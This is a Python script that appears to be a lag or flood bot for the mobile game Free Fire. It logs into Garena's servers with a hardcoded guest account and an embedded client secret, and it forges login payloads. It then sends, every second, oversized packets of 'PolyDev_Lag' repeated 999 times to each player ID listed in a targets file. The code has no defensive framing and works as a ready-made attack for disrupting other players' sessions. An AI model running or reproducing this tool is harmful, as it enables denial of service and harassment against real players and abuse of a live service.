import os
import sys
import psutil
import jwt
import pickle
import json
import requests
from protobuf_decoder.protobuf_decoder import Parser
import time
import threading
from ghost import *
import my_message_pb2
import base64
from datetime import datetime
import re
import socket
from google.protobuf.timestamp_pb2 import Timestamp
import urllib3
import sqlite3
import random
import string
import binascii

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_all_target_ids():
    FILENAME = "ids.json"
    if os.path.exists(FILENAME):
        with open(FILENAME, "r", encoding="utf-8") as f:
            try:
                data = json.load(f)
            except json.JSONDecodeError:
                return []
    else:
        return []

    return [item["target_id"] for item in data]

def restart_program():
    p = psutil.Process(os.getpid())
    open_files = p.open_files()
    connections = p.connections()

    for handler in open_files:
        try:
            os.close(handler.fd)
        except Exception:
            pass

    for conn in connections:
        try:
            conn.close()
        except Exception:
            pass

    sys.path.append(os.path.dirname(os.path.abspath(sys.argv[0])))
    python = sys.executable
    os.execl(python, python, *sys.argv)


def conn39699():   
    global dataS  
    global client_socket_1     
    global socks0500     

    client_socket_1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    client_socket_1.connect((hosts, ports))  
    print('connected with conn39699 ...')  

    Communication_token = token_hex  
    client_socket_1.send(bytes.fromhex(Communication_token))  

    while True:  
        try:   
            dataS = client_socket_1.recv(4096)  

            if len(dataS) == 0:  
                print("conn39699")  
                conn39699()  
                break  

            if "0500" in dataS.hex()[0:4]:  
                last_targets = set()  
                while True:  
                    try:  
                        all_targets = get_all_target_ids()  
                        current_targets = set(all_targets) 

                        if len(current_targets) > 0:  
                            for target_id in current_targets:  
                                packet = Refuse(target_id, key_1, iv_2)  
                                client_socket_1.send(bytes.fromhex(packet))  

                        last_targets = current_targets  
                        time.sleep(1)  
                    except Exception as e:  
                        print("Error in monitor:", e)  
                        time.sleep(1)  

        except Exception as e:  
            print(e)  
            conn39699()
            
#def conn39699(): 
#    global dataS
#    global client_socket_1   
#    global socks0500   
#    client_socket_1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#    client_socket_1.connect((hosts, ports))
#    print('connected with conn39699 ...')
#    Communication_token = token_hex
#    client_socket_1.send(bytes.fromhex(Communication_token))
#    dataS = client_socket_1.recv(2048)
#    while True:
#        try: 
#            dataS = client_socket_1.recv(4096)
#            if "0500" in dataS.hex()[0:4]:
#            	while True:
#            		all_targets = get_all_target_ids()
#            		for target_id in all_targets:
#            			packet = Refuse(target_id, key_1, iv_2)
#            			client_socket_1.send(bytes.fromhex(packet))
#            if len(dataS) == 0:
#                print("conn39699")
#                conn39699()
#                break
#            
#        except Exception as e:
#            print(e)
#            conn39699()

def Refuse(target_id,key,iv):
    text = "PolyDev_Lag"
    x = text * 999
    fields = {
    1: int(5),
    2: {
        1: int(13249381323),
        2: int(6),
        3: int(target_id),
        4: x,
    },
    }
    packet = create_protobuf_packet(fields)   
    packet = packet.hex()
    packet = encrypt_packet(packet,key,iv)
    headerx = hex(len(packet) // 2)
    header = headerx[headerx.find("0x") + 2:]
    header = "0515" + ("0" * (8 - len(header))) + header
    finalpacket = header + packet
    return finalpacket

class FF_CLIENT:
    def __init__(self, id, password, ids=None):
        self.id = id
        self.password = password
        self.get_tok()

    def connect(self, Token, tok, host, port, key, iv, host2, port2):
        clients = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        clients2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port2 = int(port2)
        port = int(port)
        global token_hex
        global ports
        global hosts
        global key_1, iv_2
        key_1 = key
        iv_2 = iv
        ports = port2
        hosts = host2
        token_hex = tok

        clients.connect((host, port))
        clients2.connect((host2, port2))
        clients2.send(bytes.fromhex(tok))
        clients.send(bytes.fromhex(tok))
        data = clients.recv(1024)
        threading.Thread(target=conn39699).start()
        time.sleep(4)
        clients2 = client_socket_1

        while True:
            try:
                data = clients.recv(1024)
                if len(data) == 0:
                    try:
                        clients.close()
                        self.connect(Token, tok, host, port, key, iv, host2, port2)
                        break
                    except:
                        try:
                            clients.close()
                            self.connect(Token, tok, host, port, key, iv, host2, port2)
                        except:
                            restart_program()
            except Exception:
                pass

    def parse_my_message(self, serialized_data):
        my_message = my_message_pb2.MyMessage()
        my_message.ParseFromString(serialized_data)
        timestamp = my_message.field21
        key = my_message.field22
        iv = my_message.field23
        timestamp_obj = Timestamp()
        timestamp_obj.FromNanoseconds(timestamp)
        timestamp_seconds = timestamp_obj.seconds
        timestamp_nanos = timestamp_obj.nanos
        combined_timestamp = timestamp_seconds * 1_000_000_000 + timestamp_nanos
        return combined_timestamp, key, iv

    def GET_PAYLOAD_BY_DATA(self, JWT_TOKEN, NEW_ACCESS_TOKEN, date):
        token_payload_base64 = JWT_TOKEN.split('.')[1]
        token_payload_base64 += '=' * ((4 - len(token_payload_base64) % 4) % 4)
        decoded_payload = base64.urlsafe_b64decode(token_payload_base64).decode('utf-8')
        decoded_payload = json.loads(decoded_payload)
        NEW_EXTERNAL_ID = decoded_payload['external_id']
        now = datetime.now()
        now = str(now)[:len(str(now)) - 7]
        formatted_time = date
        PAYLOAD = b':\x071.114.8\xaa\x01\x02ar\xb2\x01 55ed759fcf94f85813e57b2ec8492f5c\xba\x01\x014\xea\x01@6fb7fdef8658fd03174ed551e82b71b21db8187fa0612c8eaf1b63aa687f1eae\x9a\x06\x014\xa2\x06\x014'
        PAYLOAD = PAYLOAD.replace(b"6fb7fdef8658fd03174ed551e82b71b21db8187fa0612c8eaf1b63aa687f1eae", NEW_ACCESS_TOKEN.encode("UTF-8"))
        PAYLOAD = PAYLOAD.replace(b"55ed759fcf94f85813e57b2ec8492f5c", NEW_EXTERNAL_ID.encode("UTF-8"))
        PAYLOAD = PAYLOAD.hex()
        PAYLOAD = encrypt_api(PAYLOAD)
        PAYLOAD = bytes.fromhex(PAYLOAD)
        ip, port, ip2, port2 = self.GET_LOGIN_DATA(JWT_TOKEN, PAYLOAD)
        return ip, port, ip2, port2

    def dec_to_hex(self, ask):
        ask_result = hex(ask)
        final_result = str(ask_result)[2:]
        if len(final_result) == 1:
            final_result = "0" + final_result
            return final_result
        else:
            return final_result

    def convert_to_hex(self, PAYLOAD):
        hex_payload = ''.join([f'{byte:02x}' for byte in PAYLOAD])
        return hex_payload

    def convert_to_bytes(self, PAYLOAD):
        payload = bytes.fromhex(PAYLOAD)
        return payload

    def GET_LOGIN_DATA(self, JWT_TOKEN, PAYLOAD):
        url = 'https://clientbp.common.ggbluefox.com/GetLoginData'
        headers = {
            'Expect': '100-continue',
            'Authorization': f'Bearer {JWT_TOKEN}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA': 'v1 1',
            'ReleaseVersion': 'OB50',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
            'Host': 'clientbp.common.ggbluefox.com',
            'Connection': 'close',
            'Accept-Encoding': 'gzip, deflate, br',
        }

        max_retries = 3
        attempt = 0

        while attempt < max_retries:
            try:
                response = requests.post(url, headers=headers, data=PAYLOAD, verify=False)
                response.raise_for_status()
                x = response.content.hex()
                json_result = get_available_room(x)
                parsed_data = json.loads(json_result)
                address = parsed_data['32']['data']
                ip = address[:len(address) - 6]
                port = address[len(address) - 5:]
                address2 = parsed_data['14']['data']
                ip2 = address2[:len(address) - 6]
                port2 = address2[len(address) - 5:]
                return ip, port, ip2, port2

            except requests.RequestException:
                attempt += 1
                time.sleep(2)

        return None, None

    def guest_token(self, uid, password):
        locale = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
        country = ''.join(random.choice(string.ascii_lowercase) for _ in range(2))
        device = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))
        android_ver = str(random.randint(6, 13))
        url = "https://100067.connect.garena.com/oauth/guest/token/grant"
        headers = {
            "Host": "100067.connect.garena.com",
            "User-Agent": f"GarenaMSDK/4.0.19P4({device} ;Android {android_ver};{locale};{country};)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "close",
        }
        data = {
            "uid": f"{uid}",
            "password": f"{password}",
            "response_type": "token",
            "client_type": "2",
            "client_secret": "2ee44819e9b4598845141067b281621874d0d5d7af9d8f7e00c1e54715b7d1e3",
            "client_id": "100067",
        }
        response = requests.post(url, headers=headers, data=data)
        data = response.json()
        NEW_ACCESS_TOKEN = data['access_token']
        NEW_OPEN_ID = data['open_id']
        time.sleep(0.2)
        data = self.TOKEN_MAKER(NEW_ACCESS_TOKEN, NEW_OPEN_ID, uid)
        return data

    def TOKEN_MAKER(self, NEW_ACCESS_TOKEN, NEW_OPEN_ID, uid):
        PAYLOAD = b':\x071.114.8\xaa\x01\x02ar\xb2\x01 55ed759fcf94f85813e57b2ec8492f5c\xba\x01\x014\xea\x01@6fb7fdef8658fd03174ed551e82b71b21db8187fa0612c8eaf1b63aa687f1eae\x9a\x06\x014\xa2\x06\x014\xca\x03 7428b253defc164018c604a1ebbfebdf'
        PAYLOAD = PAYLOAD.replace(b"6fb7fdef8658fd03174ed551e82b71b21db8187fa0612c8eaf1b63aa687f1eae", NEW_ACCESS_TOKEN.encode("UTF-8"))
        PAYLOAD = PAYLOAD.replace(b"55ed759fcf94f85813e57b2ec8492f5c", NEW_OPEN_ID.encode("UTF-8"))
        PAYLOAD = PAYLOAD.hex()
        PAYLOAD = encrypt_api(PAYLOAD)
        PAYLOAD = bytes.fromhex(PAYLOAD)
        URL = "https://loginbp.common.ggbluefox.com/MajorLogin"
        headers = {
            "Expect": "100-continue",
            'X-Unity-Version': '2018.4.11f1',
            "X-GA": "v1 1",
            'ReleaseVersion': 'OB50',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'Bearer',
            'Content-Length': str(len(PAYLOAD.hex())),
            'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
            'Host': 'loginbp.common.ggbluefox.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        RESPONSE = requests.post(URL, headers=headers, data=PAYLOAD, verify=False)
        combined_timestamp, key, iv = self.parse_my_message(RESPONSE.content)

        if RESPONSE.status_code == 200:
            if len(RESPONSE.text) < 10:
                return False
            BASE64_TOKEN = RESPONSE.text[RESPONSE.text.find("eyJhbGciOiJIUzI1NiIsInN2ciI6IjEiLCJ0eXAiOiJKV1QifQ"):-1]
            second_dot_index = BASE64_TOKEN.find(".", BASE64_TOKEN.find(".") + 1)
            time.sleep(0.2)
            BASE64_TOKEN = BASE64_TOKEN[:second_dot_index + 44]
            req = sendrequest(2632611569, BASE64_TOKEN)
            ip, port, ip2, port2 = self.GET_PAYLOAD_BY_DATA(BASE64_TOKEN, NEW_ACCESS_TOKEN, 1)
            return BASE64_TOKEN, key, iv, combined_timestamp, ip, port, ip2, port2

        else:
            return False

    def time_to_seconds(self, hours, minutes, seconds):
        return (hours * 3600) + (minutes * 60) + seconds

    def seconds_to_hex(self, seconds):
        return format(seconds, '04x')

    def extract_time_from_timestamp(self, timestamp):
        dt = datetime.fromtimestamp(timestamp)
        h = dt.hour
        m = dt.minute
        s = dt.second
        return h, m, s

    def get_tok(self):
        token, key, iv, Timestamp, ip, port, ip2, port2 = self.guest_token(self.id, self.password)
        Token = token

        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            account_id = decoded.get('account_id')
            print(account_id)
            self.acc_id = account_id
            encoded_acc = hex(account_id)[2:]
            hex_value = dec_to_hex(Timestamp)
            time_hex = hex_value
            BASE64_TOKEN_ = token.encode().hex()
        except Exception as e:
            return

        try:
            head = hex(len(encrypt_packet(BASE64_TOKEN_, key, iv)) // 2)[2:]
            length = len(encoded_acc)
            zeros = '00000000'

            if length == 9:
                zeros = '0000000'
            elif length == 8:
                zeros = '00000000'
            elif length == 10:
                zeros = '000000'
            elif length == 7:
                zeros = '000000000'
            else:
                pass

            head = f'0115{zeros}{encoded_acc}{time_hex}00000{head}'
            final_token = head + encrypt_packet(BASE64_TOKEN_, key, iv)
        except Exception:
            pass

        token = final_token
        self.connect(Token, token, ip, port, key, iv, ip2, port2)
        return token, key, iv

FF_CLIENT("4161491959", "DE8832C38A0CC07299A43C6E840C6B5545D5A535A4434E1A6B744CC5A61A130C")
